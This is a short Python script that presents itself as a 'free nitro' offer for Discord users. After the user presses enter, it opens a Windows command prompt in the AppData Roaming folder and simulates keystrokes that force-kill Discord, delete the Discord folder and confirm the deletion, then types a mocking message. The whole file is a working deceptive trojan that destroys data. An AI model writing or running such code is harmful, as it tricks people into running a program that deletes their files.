import pynput
import time
import subprocess
import os
input("enter to get free nitro\n")
user ="c:"
k =pynput.keyboard.Controller()
enter = pynput.keyboard.Key.enter
login = os.getlogin()
print("deleting discord temp")
time.sleep(0.5)
cmd =subprocess.Popen("cmd.exe /K cd C:/Users/"+ login +"/AppData/Roaming")
time.sleep(0.3)
k.type("taskkill /F /IM discord.exe")
k.press(enter)
time.sleep(0.3)
k.type("del discord")
k.press(enter)
time.sleep(0.3)
k.type("y")
k.press(enter)
time.sleep(0.5)
k.type("you really thought you gonna get free nitro")